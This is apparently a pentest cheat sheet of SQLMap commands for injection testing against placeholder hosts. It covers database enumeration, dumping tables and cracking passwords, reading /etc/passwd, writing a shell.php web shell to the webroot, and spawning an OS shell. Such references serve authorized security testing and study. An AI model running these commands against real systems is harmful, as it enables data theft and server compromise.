
---

### **SQLMap General Commands**

|**Command**|**Description**|
|---|---|
|`sqlmap -h`|Display the basic help menu.|
|`sqlmap -hh`|Display the advanced help menu.|
|`sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`|Run SQLMap without requiring user input.|
|`sqlmap -r req.txt`|Use an HTTP request file for testing.|
|`sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`|Specify a cookie header.|
|`sqlmap -u www.target.com --data='id=1' --method PUT`|Specify a PUT request.|
|`sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`|Save traffic logs to a file.|
|`sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`|Set verbosity level (0-6).|
|`sqlmap --list-tampers`|List all available tamper scripts.|

---

### **SQL Injection Methods**

|**Command**|**Description**|
|---|---|
|`sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`|SQLMap with POST request.|
|`sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`|Specify injection point with an asterisk.|
|`sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`|Add a prefix or suffix to payloads.|

---

### **Database Enumeration**

|**Command**|**Description**|
|---|---|
|`sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`|Basic database enumeration.|
|`sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`|Enumerate tables in a specific database.|
|`sqlmap -u "http://www.example.com/?id=1" --schema`|Enumerate database schema.|
|`sqlmap -u "http://www.example.com/?id=1" --search -T user`|Search for specific data in the database.|

---

### **Data Extraction**

|**Command**|**Description**|
|---|---|
|`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`|Dump specific columns from a table.|
|`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`|Conditional data extraction.|
|`sqlmap -u "http://www.example.com/?id=1" --passwords --batch`|Dump and crack database passwords.|

---

### **Advanced Techniques**

| **Command**                                                                                                               | **Description**                       |
| ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------- |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Bypass anti-CSRF tokens.              |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check if the user has DBA privileges. |

---

### **File Operations**

|**Command**|**Description**|
|---|---|
|`sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`|Read a file from the target system.|
|`sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`|Write a file to the target system.|

---

### **Command Execution**

|**Command**|**Description**|
|---|---|
|`sqlmap -u "http://www.example.com/?id=1" --os-shell`|Spawn an OS shell on the target.|

---
